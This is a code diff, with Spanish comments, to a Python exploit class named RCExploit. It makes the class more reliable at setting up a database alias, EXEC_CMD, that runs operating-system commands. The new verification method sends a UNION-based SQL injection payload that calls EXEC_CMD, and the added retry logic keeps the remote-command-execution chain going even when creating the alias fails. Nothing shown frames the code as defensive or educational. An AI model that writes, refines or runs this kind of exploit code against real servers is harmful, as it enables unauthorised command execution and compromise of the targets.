@@ -253,11 +253,19 @@ class RCExploit:
                 elif response.status_code == 500:
                     # Error 500 puede significar que el alias ya existe o error SQL
                     error_text = response.text.lower()
-                    if "already exists" in error_text or "duplicate" in error_text:
+                    if "already exists" in error_text or "duplicate" in error_text or "name already exists" in error_text:
                         self.logger.info("Alias ya existe, continuando...")
                         self.rce_enabled = True
                         return True
                     else:
+                        # Si es error 500, puede ser que el alias ya existe y está causando conflicto
+                        # Intentar verificar si el alias funciona en lugar de crearlo de nuevo
+                        self.logger.warning(f"Error 500 al crear alias. Verificando si ya existe...")
+                        if self._verify_alias_exists():
+                            self.logger.info("Alias ya existe y está funcional, continuando...")
+                            self.rce_enabled = True
+                            return True
+                        
                         self.logger.warning(f"Error 500 al crear alias: {response.text[:200]}")
                         if attempt < max_retries - 1:
                             continue
@@ -265,8 +273,51 @@ class RCExploit:
                     self.logger.warning(f"Status inesperado al crear alias: {response.status_code}")
                     if attempt < max_retries - 1:
                         continue
+            else:
+                # Si no hay respuesta, puede ser que el alias ya existe y está causando problemas
+                # Intentar verificar si funciona
+                self.logger.debug("No se obtuvo respuesta, verificando si el alias ya existe...")
+                if self._verify_alias_exists():
+                    self.logger.info("Alias ya existe y está funcional, continuando...")
+                    self.rce_enabled = True
+                    return True
+                if attempt < max_retries - 1:
+                    continue
+        
+        # Último intento: verificar si el alias funciona aunque falle la creación
+        self.logger.info("Verificando si el alias EXEC_CMD ya existe y funciona...")
+        if self._verify_alias_exists():
+            self.logger.info("Alias ya existe y está funcional")
+            self.rce_enabled = True
+            return True
         
         self.logger.error("No se pudo crear o verificar el alias EXEC_CMD")
+        return False
+    
+    def _verify_alias_exists(self) -> bool:
+        """
+        Verifica si el alias EXEC_CMD ya existe intentando ejecutar un comando simple.
+        
+        Returns:
+            True si el alias existe y funciona, False en caso contrario
+        """
+        try:
+            # Intentar ejecutar un comando simple para verificar si el alias funciona
+            test_payload = "test' UNION SELECT NULL,EXEC_CMD('echo test'),NULL--"
+            response = self.execute_sql(test_payload)
+            
+            if response and response.status_code == 200:
+                try:
+                    data = response.json()
+                    # Si obtenemos una respuesta válida, el alias existe
+                    if isinstance(data, list) and len(data) > 0:
+                        return True
+                except ValueError:
+                    # Incluso si no es JSON válido, si no es error 500, el alias puede existir
+                    return True
+        except Exception as e:
+            self.logger.debug(f"Error verificando alias: {e}")
+        
         return False
     
     def execute_command(self, command: str) -> Optional[str]:
